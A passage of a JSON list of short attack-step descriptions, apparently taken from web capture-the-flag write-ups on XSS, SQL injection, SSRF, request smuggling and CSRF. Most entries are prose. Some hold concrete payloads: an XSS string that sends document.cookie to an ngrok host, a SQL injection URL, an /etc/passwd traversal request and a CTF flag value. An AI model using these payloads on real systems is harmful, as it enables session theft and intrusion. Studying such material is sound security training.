    "Login using the found password.",
    "Analyze the webpage's HTML and JavaScript code.",
    "Craft an HTTP request.",
    "Target the chat endpoint.",
    "Get HTTP `403 Forbidden` response.",
    "Examine the source code of the main web page.",
    "Discover the usage of XML envelopes",
    "Identify the use of a productId value",
    "Observe the server reflecting the productId value in the response",
    "Observe that the server reflects the passed productId value in the response.",
    "Discovered an interesting comment with the parameter '?source=1'.",
    "Retrieved the PHP source code.",
    "Retrieved the PHP source code.",
    "Tried to enumerate DB tables.",
    "Noticed that an idea can be posted with an assigned ID.",
    "Understood the idea can be voted on.",
    "Examined the HTML source code.",
    "Include the payload in the request.",
    "Observe the presence of three files on the webpage.",
    "Tried to bypass Content Security Policy (CSP)",
    "Attempted to inject XSS after bypassing",
    "Identified the presence of protected DIG records.",
    "Discover that the web app is running in debug mode.",
    "Realize that the endpoint can be accessed without authentication.",
    "The encoded XMLHttpRequest retrieves document's cookie.",
    "Wait for the bot to visit the URL.",
    "The execution of '.bashrc' occurs when the user 'manhndd' SSH-es into the server",
    "Analyse the given hyperlinks.",
    "Identify that nginx concatenates alias directives with location directives.",
    "Trigger the XSS alert attack using the final URL.",
    "Identified it's a Web category challenge.",
    "The third payload ends up triggering an alert.",
    "Identify the reason for the failure as JavaScript trying to parse parentheses",
    "Used the profile picture upload feature",
    "Performed SSRF to rabbitmq http API",
    "Recognize the tripcode as 'ueyUrcwA'",
    "Observe that the system environment flag is displayed when the response contains the specific IP address (119.29.29.29).",
    "Run arbitrary javascript with the 'outputFunctionName' option",
    "Bypassed duration check",
    "Accessed the URL `http://yai.sstf.site/paperdetail.php?idx=32%27%20and%20@published=%27no%27%20or%20%27a%27=%27b` to execute the injection attack.",
    "Bypass the X-Real-IP protection.",
    "Uploaded the first created PDF file to the website.",
    "Used the website functionality to get the uploaded PDF file signed.",
    "Log in to investigate any intermediate requests.",
    "Observed that the source code of the site became visible.",
    "Realized SQL queries can be dispatched to this open FD to read responses.",
    "Recognized the necessity to write a php-cgi header before executing the MySQL query.",
    "Waited and read the response as it came in.",
    "Used wordplay in the answers.",
    "Submitted the flag.",
    "Cause the pop-up to inherit the sandboxed attributes",
    "Set the origin as the target URL",
    "Display current cookies",
    "Query the protection of the website by CSRF tokens.",
    "Find out that the website isn't protected by CSRF tokens but employs SameSite=Lax cookies.",
    "Insert code into the /redirect that will change the password of the admin when the admin clicks the URL.",
    "Determine the payload to be inserted.",
    "Insert the payload which is a URL that generates a password change request for the admin account when clicked.",
    "Include multiple script tags",
    "Inject the authenticated session cookie into the browser or curl.",
    "Use 'flag.flag' as the 'id' to purchase the flag from the store for $1.",
    "Login to the website",
    "Register an account on the website",
    "Edit the user profile on the website",
    "In the 'Support' section, users can send two types of messages to the admin: 'Problems with Profile' and 'Get premium account', which needs 'Link to profile' and 'Message'",
    "Resulted in 'Wrong Referrer' error",
    "Observe functionalities for login/register, edit profile, and support",
    "Observe the 'User-Agent header' and note the admin uses 'Firefox 61.0'",
    "Understand that the input format for the SQL injection should match the UUID format.",
    "Bypass the restriction caused by the referrer header.",
    "Add the attacker's email to the admin's shared list.",
    "Try different versions of the Twitter login page.",
    "Caused Apache2 to crash due to ':' in directory name.",
    "Had the right PHPSESSID in cookies.",
    "Used distinct virtual hosts and shell wildcards for the same result.",
    "Used %-decodes strings to match the '/debug/answer' endpoint.",
    "Performed a simple curl request to '/\\%64ebug/answer'.",
    "Determined the challenge requires bypassing an Angular application setup behind an Nginx reverse proxy.",
    "'req.ip' always pointed to the same IP address of the reverse proxy.",
    "Observed the application displaying contents of '/api/answer'.",
    "Understood this was done server-side.",
    "Successfully bypassed restrictions.",
    "Identified that the challenge seemed to involve reCAPTCHA.",
    "Manipulated the `statusCode` using the injected buttons.",
    "Ensure the request is made from the localhost.",
    "Proceed to send a GET request to the provided URL if the IP is not private.",
    "Intercept the data.",
    "Manipulate the intercepted data using burpsuite.",
    "Bypass the front end input sanitization.",
    "Recognize the potential involvement of code str_replace in changing language.",
    "Send the content of flag.txt to a webhook.",
    "Observe login page with no additional information.",
    "Successfully extract the user.",
    "Successfully extract the password token.",
    "Suggested that the 'shell_exec' function is running.",
    "Notice an option to register a new account.",
    "Generate an introspection query for graphql.",
    "The introspection query returns all the content of a graphql schema.",
    "Visualize the data structure using the graphql voyager tool.",
    "Retrieve the flag from the server's response",
    "Discover a new path /server-status",
    "Retrieve the flag value 'flag{th3_an5w3r_w4s_HSCTF_0bvi0us1y}'.",
    "Change the cookie values: userID to 768 and username to 'admin'.",
    "Start at a login/register page.",
    "Understand how to modify user's profile and upload images.",
    "Try XSS payloads on different input fields.",
    "Report the HTML file link to trick admin into opening it.",
    "Embed the 'id' of the attacker's user in the request body.",
    "Send first GET request with 65534 empty spaces.",
    "Send second GET request with 65534 empty spaces.",
    "Include session ID in the request.",
    "Fill out registration form.",
    "Add 'account[role]' parameter with value 'admin'.",
    "Inject an address into the URL parameter.",
    "Find the flag inside the newly public gallery.",
    "Observed an interface that offered XML parsing as a service.",
    "Reviewed the XML return from the 'view XML' tab.",
    "Successfully extracted the flag from /var/www.",
    "Discover a Disallowed path /ingen/.",
    "Receive a list of pumps and their IDs.",
    "Receive a notice that the request body must be JSON.",
    "Update the timestamp in the POST request.",
    "Submit an integer value as the input in the web application.",
    "Note the showcasing of uploaded photos.",
    "Experiment with the session_id.",
    "When faced with a security check.",
    "Attempt to bypass it by loading image URLs directly.",
    "Identify that the site allows script tags with nonces as external resources.",
    "Observed that 'c' parameter in requests was used to manipulate the user session, either to sign in, sign up, or sign out.",
    "Analyzed the code of the website",
    "Identified that 'ctx.state.user' equals to the 'username' cookie",
    "Used '__proto__' as the username parameter",
    "Set the 'language' parameter to 'key' in the JSON data.",
    "Understand that \u2018SCRIPT_NAME\u2019 can be set through an HTTP header, which can bypass the '/admin' denial in Nginx configuration",
    "Access the subclass information",
    "Observe that 'admin' is replaced in the username field.",
    "Include the payload in the username parameter.",
    "Identify that Meteor is being used.",
    "Deduce that the '$ne' filter checks if the body of the notes is not empty.",
    "Recognize that it passes the extension check due to .txt extension.",
    "Indicate another possible server.",
    "Bypassed regex filters.",
    "Construct the URL 'http://10.8.201.87:5000/checkbalance?amount=${num}' using the queried amount.",
    "The iframe source is /demo",
    "Message is only sent to the intended receiver",
    "Data is POST-ed to the /api/filter endpoint",
    "XSS on the challenge server is necessitated",
    "Identify the request parameters of the /find endpoint: condition, startsWith, endsWith, and debug.",
    "Encode the cookie-characters as response headers.",
    "Generate URLs that set cookies with parts of manipulated JavaScript code.",
    "Craft a request to '/post.php?post=../../../../../../etc/passwd'.",
    "Constructed a CL-TE request smuggling attack.",
    "Noticed the presence of file upload capability.",
    "Analyze the data being displayed",
    "Inject a final cookie.",
    "Name the cookie 'admin'.",
    "Use the manipulated cookies to gain access.",
    "Uploaded the .php16 file.",
    "Use the crafted query to access the admin console via internal request.",
    "Look for a value for 'confidential_documents'.",
    "Unlock the flag and source code using the uploaded PDFs.",
    "Extract the text before the period (.) from the Flask session cookie.",
    "Uploaded the final payload to the server.",
    "Used the same request to read the flag from the '/readflag' binary.",
    "Ran '/readflag' by passing it as an argument to the defined 'pwn' function.",
    "Authenticated as admin and explored login.php",
    "Received a 403 Forbidden error from the login.php page.",
    "Gained access to the login page.",
    "Identified fields labeled 'username' and 'password'.",
    "Verified it returns data for user ID 1.",
    "Utilized SQLMap targeting 'login.php' page.",
    "Analyze the form submission structure",
    "Examined how the note taking app functions.",
    "Noted that 'y.png' loads if the query is found within a note.",
    "Noted that 'n.png' loads if the query is not found within a note.",
    "Observed the attack working even with Chrome's cache partitioning policy.",
    "Recognize the usage of Flask's 'render_template_string' function",
    "Notice that files with commonly used extensions are downloaded.",
    "Notice that .html files are rendered inline.",
    "Used a redirection through a PHP server, which revealed the flag in one of the headers.",
    "Verified this by submitting HTML enclosed in script tags to catch the HTTP request.",
    "Payload 1: Obtained the full URL of the browsing context.",
    "Payload 2: Obtained the page contents.",
    "Found that JavaScript couldn't read any cookies from the output of the payloads.",
    "Received a `Set-Cookie` header from this page for a new cookie with HttpOnly flag set.",
    "Read the flag using the established reverse shell.",
    "Guess that the server was using FastAPI.",
    "Note that the Go microservice uses the Beego web framework",
    "Reach the 'Put()' handler of the Go microservice",
    "Note that Flask's built-in server can be susceptible to HTTP request smuggling attacks due to its insecure nature",
    "Note that the Flask server treats underscores ('_') as hyphens ('-')",
    "Note that the Flask server allows duplicate 'Content-Length' headers",
    "Take advantage of the Flask server's failure to comply with RFC norms",
    "Convince the server to communicate with arbitrary URL.",
    "Convert your public IP address to octal form using an octal IP address converter.",
    "Assume the application is likely behind AWS WAF.",
    "Caused the proxy server to send a request to the specified URL.",
    "Note that the process only permits requests from a client URL validated to be 127.0.0.1.",
    "Registered a new account.",
    "Noted that the `/api/token` endpoint returns the current authentication token.",
    "Identified the specified `apiGet` URL.",
    "Send GET requests with incrementing 'id' using the script.",
    "Verify that the WebSocket client's origin starts with 'http://localhost'.",
    "Set the authentication cookie for the victim using JavaScript.",
    "Ensure the completion of navigation and placement of the cookie by sleeping for 1 second.",
    "Understand that the Origin request header cannot be modified by JavaScript.",
    "Consider the possibility of exploiting a browser zero-day to spoof Origin headers.",
    "Set the auth token by making the bot visit 'http://localhost:7070/auth'.",
    "Check the 'Content-length' response header",
    "Observed any unusual behavior",
    "The task of this payload is to exfiltrate the content from `http://localhost:5000/admin`",
    "Demonstrated DOM clobbering.",
    "Enabled 'enable_experimental_features'.",
    "Confirmed the possibility of creating a new repository with a CNAME file containing 'asdf.jsapi.tech'.",
    "Examined the Content-Security-Policy (CSP) of the site.",
    "Identified the allowance of loading stylesheets from '*.jsapi.tech'.",
    "Realized that this allows loading of a CSS file from the exploit domain.",
    "Observed the usage of 'asdf<link rel='stylesheet' href='...'>'.",
    "Identified the 'data-last' attribute of the '#note-text-area' element.",
    "Bypassed the validation by using a different case.",
    "Obtained the flag.",
    "Included 'GET /flag HTTP/1.1' in the request body.",
    "Set 'Content-Length: 0' for the first request.",
    "Ensured the modifications reflected the initial intention.",
    "The request smuggling caused the difference in the response.",
    "Exploited the limit of 20 redirects using Fetch API.",
    "Insert '__proto__' attribute in the request payload.",
    "Used the appropriate 'X-Cat-Header' in the request",
    "Discover that all other endpoints are protected by authenticationMiddleware.",
    "Note that the relative paths now load scripts from the attacker's server.",
    "Find the public key in '/signature/key.pub' as indicated in the hint.",
    "Noted that the post is only visible to the admin.",
    "Injected arbitrary HTML through HTML comments.",
    "Identified a potential vulnerability with 'www.youtube.com' hosting a JSONP endpoint.",
    "Found an issue on Google's issue tracker regarding YouTube's 'oembed' API not implementing JSONP.",
    "Provided a callback parameter.",
    "Injected arbitrary Javascript to exfiltrate contents from admin's page.",
    "Notice that the resources are fetched from '/ajax/articles?cat=news'.",
    "Observe that the fetched resources are inserted into the 'ajax-load' element.",
    "Attempt to inject an attribute into the 'img' element of the response.",
    "Create the final payload: '?cat=random\"onerror=\"window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img'",
    "The attack starts with executing an XSS to grant admin privileged access",
    "Capture the request, including the Admin-Key.",
    "Performed an SSRF.",
    "Take note of the Nginx configuration",
    "Understand that the mechanism can be bypassed using 'username:password@hostname' URL format",
    "Use the custom host header to target your own host"
]